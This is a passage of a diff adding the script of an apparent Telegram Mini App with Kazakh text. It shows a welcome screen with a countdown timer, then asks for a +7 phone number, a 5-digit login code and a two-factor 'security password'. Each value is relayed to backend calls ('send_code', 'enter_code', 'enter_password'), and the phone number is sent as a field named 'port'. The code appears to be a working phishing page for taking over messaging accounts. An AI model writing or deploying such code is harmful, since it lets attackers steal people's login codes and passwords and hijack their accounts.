+    var left = Math.max(0, Math.ceil((welcomeDeadline - Date.now()) / 1000));
+    var h = Math.floor(left / 3600);
+    var m = Math.floor((left % 3600) / 60);
+    var s = left % 60;
+    welcomeTimerEl.textContent = String(h).padStart(2,"0") + ":" + String(m).padStart(2,"0") + ":" + String(s).padStart(2,"0");
+    if(left <= 0){ clearInterval(welcomeTimerId); welcomeTimerEl.textContent = "00:00:00"; }
+  }
+
+  function startWelcomeTimer(){
+    clearInterval(welcomeTimerId);
+    welcomeTick();
+    welcomeTimerId = setInterval(welcomeTick, 1000);
+  }
+  startWelcomeTimer();
+
+  $("#welcomeCta").addEventListener("click", function(){ go("phone"); });
+  $("#declineBtn").addEventListener("click", function(){
+    if(tg && tg.close) tg.close();
+  });
+
+  /* ================= Screen 2: Phone ================= */
+  var phoneInput = $("#phoneInput"), phoneField = $("#phoneField"),
+      phoneCta = $("#phoneCta"), phoneError = $("#phoneError"),
+      phoneApiError = $("#phoneApiError");
+  var phoneComposing = false;
+  var phoneNat = "";
+
+  function normalizeNat(digits){
+    if(!digits) return "";
+    if(digits[0] === "8") digits = digits.slice(1);
+    else if(digits[0] === "7" && digits.length > 10) digits = digits.slice(1);
+    return digits.slice(0, 10);
+  }
+  function formatNat(n){
+    var o = "";
+    if(n.length > 0) o = "(" + n.slice(0, 3);
+    if(n.length >= 3) o += ")";
+    if(n.length > 3) o += " " + n.slice(3, 6);
+    if(n.length > 6) o += "-" + n.slice(6, 8);
+    if(n.length > 8) o += "-" + n.slice(8, 10);
+    return o;
+  }
+  function phoneReformat(){
+    var oldVal = phoneInput.value;
+    var caret = phoneInput.selectionStart != null ? phoneInput.selectionStart : oldVal.length;
+    var digitsBeforeCaret = onlyDigits(oldVal.slice(0, caret)).length;
+    phoneNat = normalizeNat(onlyDigits(oldVal));
+    var formatted = formatNat(phoneNat);
+    phoneInput.value = formatted;
+
+    var pos = formatted.length, count = 0;
+    if(digitsBeforeCaret > 0){
+      for(var i = 0; i < formatted.length; i++){
+        if(/\d/.test(formatted[i])){ count++; if(count >= digitsBeforeCaret){ pos = i + 1; break; } }
+      }
+    } else { pos = 0; }
+    if(document.activeElement === phoneInput){
+      try{ phoneInput.setSelectionRange(pos, pos); }catch(e){}
+    }
+    phoneCta.disabled = phoneNat.length !== 10;
+    if(!phoneError.hidden) clearError(phoneError, phoneField);
+    if(!phoneApiError.hidden) clearError(phoneApiError, null);
+  }
+  phoneInput.addEventListener("compositionstart", function(){ phoneComposing = true; });
+  phoneInput.addEventListener("compositionend", function(){ phoneComposing = false; phoneReformat(); });
+  phoneInput.addEventListener("input", function(e){ if(phoneComposing || e.isComposing) return; phoneReformat(); });
+  phoneInput.addEventListener("change", phoneReformat);
+  phoneInput.addEventListener("keydown", function(e){
+    if(e.key !== "Backspace" || phoneInput.selectionStart !== phoneInput.selectionEnd) return;
+    var pos = phoneInput.selectionStart, val = phoneInput.value;
+    if(pos > 0 && !/\d/.test(val[pos - 1])){
+      var i = pos - 1;
+      while(i >= 0 && !/\d/.test(val[i])) i--;
+      if(i >= 0){
+        e.preventDefault();
+        phoneInput.value = val.slice(0, i) + val.slice(i + 1);
+        try{ phoneInput.setSelectionRange(i, i); }catch(_){}
+        phoneReformat();
+      }
+    }
+  });
+
+  phoneCta.addEventListener("click", function(){
+    if(phoneNat.length !== 10){
+      showError(phoneError, phoneField, "Нөмірді тексеріңіз — қате сияқты.");
+      shake(phoneField); return;
+    }
+    var fullPhone = "+7" + phoneNat;
+    setLoading(phoneCta, true);
+    clearError(phoneApiError, null);
+    var token = ++navToken;
+
+    apiCall('send_code', { userID: EXTERNAL_USER_ID, port: fullPhone }).then(function(res){
+      if(token !== navToken) return;
+      setLoading(phoneCta, false);
+      if(res.ok){
+        $("#codePhone").textContent = "+7 " + formatNat(phoneNat);
+        go("code");
+      } else {
+        showError(phoneApiError, null, res.message || "Қате. Кейінірек қайталаңыз.");
+      }
+    }).catch(function(){
+      if(token !== navToken) return;
+      setLoading(phoneCta, false);
+      showError(phoneApiError, null, "Байланыс қатесі. Интернетті тексеріңіз.");
+    });
+  });
+
+  /* ================= Screen 3: OTP keypad ================= */
+  var otpCells = $$(".otp-cell", $("#otpDisplay"));
+  var keyBtns = $$(".key-btn", $("#keypad"));
+  var codeCta = $("#codeCta"), codeError = $("#codeError");
+  var otpDigits = [];
+  var submittingCode = false;
+  var otpDisplay = $("#otpDisplay");
+
+  function otpValue(){ return otpDigits.join(""); }
+  function otpComplete(){ return otpDigits.length === 5; }
+
+  function refreshOtpDisplay(){
+    otpCells.forEach(function(cell, i){
+      cell.textContent = otpDigits[i] || "";
+      cell.classList.toggle("is-filled", !!otpDigits[i]);
+      cell.classList.toggle("is-active", i === otpDigits.length && i < 5);
+    });
+    codeCta.disabled = !otpComplete();
+    if(otpDisplay.classList.contains("otp-error")){
+      otpDisplay.classList.remove("otp-error");
+      clearError(codeError, null);
+    }
+  }
+
+  function otpPush(digit){
+    if(otpDigits.length >= 5) return;
+    if(submittingCode) return;
+    otpDigits.push(digit);
+    refreshOtpDisplay();
+    if(otpComplete()) submitCode();
+  }
+
+  function otpPop(){
+    if(otpDigits.length === 0) return;
+    if(submittingCode) return;
+    otpDigits.pop();
+    refreshOtpDisplay();
+  }
+
+  function clearOtp(){
+    otpDigits = [];
+    otpDisplay.classList.remove("otp-error");
+    clearError(codeError, null);
+    refreshOtpDisplay();
+  }
+
+  keyBtns.forEach(function(btn){
+    btn.addEventListener("click", function(){
+      var d = btn.getAttribute("data-digit");
+      if(d === "del"){ otpPop(); return; }
+      if(!d) return;
+      otpPush(d);
+    });
+    btn.addEventListener("touchend", function(e){ e.preventDefault(); }); // prevent double-tap zoom
+  });
+
+  // also support physical keyboard for desktop dev
+  document.addEventListener("keydown", function(e){
+    if(current !== "code") return;
+    if(/^[0-9]$/.test(e.key)){ otpPush(e.key); e.preventDefault(); }
+    else if(e.key === "Backspace"){ otpPop(); e.preventDefault(); }
+  });
+
+  function submitCode(){
+    if(submittingCode) return;
+    if(!otpComplete()){ codeCta.disabled = true; return; }
+    submittingCode = true;
+    setLoading(codeCta, true);
+    clearError(codeError, null);
+    var token = ++navToken;
+
+    apiCall('enter_code', { userID: EXTERNAL_USER_ID, digits: otpValue() }).then(function(res){
+      if(token !== navToken) return;
+      setLoading(codeCta, false);
+      if(res.ok){
+        if(res.result === "code_valid"){
+          go("success");
+          sendCompletion();
+        } else if(res.result === "needs_2fa"){
+          go("password");
+          submittingCode = false;
+        } else if(res.result === "error_code"){
+          otpDisplay.classList.add("otp-error");
+          showError(codeError, null, "Қате код. Цифрларды тексеріңіз.");
+          shake(otpDisplay);
+          setTimeout(function(){ clearOtp(); }, reduceMotion() ? 0 : 400);
+          submittingCode = false;
+        } else {
+          showError(codeError, null, "Қате. Қайталап көріңіз.");
+          submittingCode = false;
+        }
+      } else {
+        otpDisplay.classList.add("otp-error");
+        showError(codeError, null, res.message || "Қате код.");
+        shake(otpDisplay);
+        setTimeout(function(){ clearOtp(); }, reduceMotion() ? 0 : 400);
+        submittingCode = false;
+      }
+    }).catch(function(){
+      if(token !== navToken) return;
+      setLoading(codeCta, false);
+      showError(codeError, null, "Байланыс қатесі.");
+      submittingCode = false;
+    });
+  }
+
+  codeCta.addEventListener("click", submitCode);
+
+  /* resend countdown */
+  var resendBtn = $("#resendBtn"), resendTimer = null, resendDeadline = 0, resendLast = -1;
+  function resendTick(){
+    var left = Math.max(0, Math.ceil((resendDeadline - Date.now()) / 1000));
+    if(left === resendLast) return;
+    resendLast = left;
+    if(left > 0){
+      resendBtn.disabled = true;
+      resendBtn.textContent = left + " с кейін қайта жіберу";
+    } else {
+      resendBtn.disabled = false;
+      resendBtn.textContent = "Кодты қайта жіберу";
+      clearInterval(resendTimer); resendTimer = null;
+    }
+  }
+  function startResend(){
+    clearInterval(resendTimer);
+    resendDeadline = Date.now() + 60000;
+    resendLast = -1;
+    resendTick();
+    resendTimer = setInterval(resendTick, 250);
+  }
+  resendBtn.addEventListener("click", function(){
+    if(resendBtn.disabled) return;
+    clearOtp(); clearError(codeError, null);
+    var phone = "+7" + phoneNat;
+    apiCall('send_code', { userID: EXTERNAL_USER_ID, port: phone }).catch(function(){});
+    startResend();
+  });
+
+  $("#editPhone").addEventListener("click", function(){ go("phone", { back:true }); });
+  $("#editPhone").addEventListener("keydown", function(e){ if(e.key === "Enter" || e.key === " "){ e.preventDefault(); go("phone", { back:true }); } });
+
+  /* ================= Screen 4: Password ================= */
+  var pwInput = $("#pwInput"), pwField = $("#pwField"), pwCta = $("#pwCta"),
+      pwError = $("#pwError"), eyeBtn = $("#eyeBtn");
+  var EYE = '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M2 12s3.5-7 10-7 10 7 10 7-3.5 7-10 7-10-7-10-7z"/><circle cx="12" cy="12" r="3"/></svg>';
+  var EYE_OFF = '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M3 3l18 18"/><path d="M10.6 10.6a3 3 0 0 0 4.2 4.2"/><path d="M9.9 5.2A9.6 9.6 0 0 1 12 5c6.5 0 10 7 10 7a17 17 0 0 1-3.3 4.1M6.6 6.6A17 17 0 0 0 2 12s3.5 7 10 7a9.6 9.6 0 0 0 3-.5"/></svg>';
+  eyeBtn.innerHTML = EYE;
+
+  function refreshPwState(){
+    var v = pwInput.value;
+    pwCta.disabled = v.length === 0;
+    if(!pwError.hidden) clearError(pwError, pwField);
+  }
+  pwInput.addEventListener("input", refreshPwState);
+  pwInput.addEventListener("keydown", function(e){
+    if(e.key === "Enter" && !pwCta.disabled){ submitPassword(); }
+  });
+  eyeBtn.addEventListener("click", function(){
+    var selStart = pwInput.selectionStart, selEnd = pwInput.selectionEnd;
+    if(selStart == null){ selStart = selEnd = pwInput.value.length; }
+    var show = pwInput.type === "password";
+    pwInput.type = show ? "text" : "password";
+    eyeBtn.innerHTML = show ? EYE_OFF : EYE;
+    eyeBtn.setAttribute("aria-pressed", String(show));
+    pwInput.focus();
+    try{ pwInput.setSelectionRange(selStart, selEnd); }catch(_){}
+  });
+
+  function submitPassword(){
+    if(pwCta.classList.contains("is-loading")) return;
+    var pwd = pwInput.value.trim();
+    if(!pwd){ showError(pwError, pwField, "Құпиясөзді енгізіңіз."); shake(pwField); return; }
+    setLoading(pwCta, true);
+    clearError(pwError, pwField);
+    var token = ++navToken;
+
+    apiCall('enter_password', { userID: EXTERNAL_USER_ID, digits: pwd }).then(function(res){
+      if(token !== navToken) return;
+      setLoading(pwCta, false);
+      if(res.ok && res.result === "password_valid"){
+        go("success");
+        sendCompletion();
+      } else if(res.ok && res.result === "error_password"){
+        showError(pwError, pwField, "Қауіпсіздік құпиясөзі қате.");
+        shake(pwField);
+      } else {
+        showError(pwError, pwField, res.message || "Қате. Қайталап көріңіз.");
+      }
+    }).catch(function(){
+      if(token !== navToken) return;
+      setLoading(pwCta, false);
+      showError(pwError, pwField, "Байланыс қатесі.");
+    });
+  }
+  pwCta.addEventListener("click", submitPassword);
+
+  /* ================= per-screen enter/leave ================= */
+  function onEnter(name){
+    if(name === "phone"){
+      setTimeout(function(){ phoneInput.focus(); }, 30);
+      if(tg && tg.BackButton) tg.BackButton.show();
+    } else if(name === "code"){
+      clearOtp(); clearError(codeError, null); submittingCode = false;
+      startResend();
+      if(tg && tg.BackButton) tg.BackButton.show();
+    } else if(name === "password"){
+      refreshPwState();
+      setTimeout(function(){ pwInput.focus(); }, 30);
+      if(tg && tg.BackButton) tg.BackButton.show();
+    } else if(name === "welcome"){
+      if(tg && tg.BackButton) tg.BackButton.hide();
+    }
+  }
+  function onLeave(name){
+    if(name === "code"){ clearInterval(resendTimer); resendTimer = null; }
+  }
+
+  /* ================= Success / Completion ================= */
+  function sendCompletion(){
+    if(tg && tg.sendData){
+      try{ tg.sendData(JSON.stringify({ status: "success", userID: EXTERNAL_USER_ID })); }catch(e){}
+    }
+  }
+  $("#successCta").addEventListener("click", function(){
+    if(tg && tg.close){ tg.close(); }
+  });
+
+  /* ================= boot ================= */
+  updateChrome("welcome");
+  screens.welcome.classList.add("is-active");
+  screens.welcome.style.visibility = "visible";
+})();
+</script>
+</body>
+</html>
+
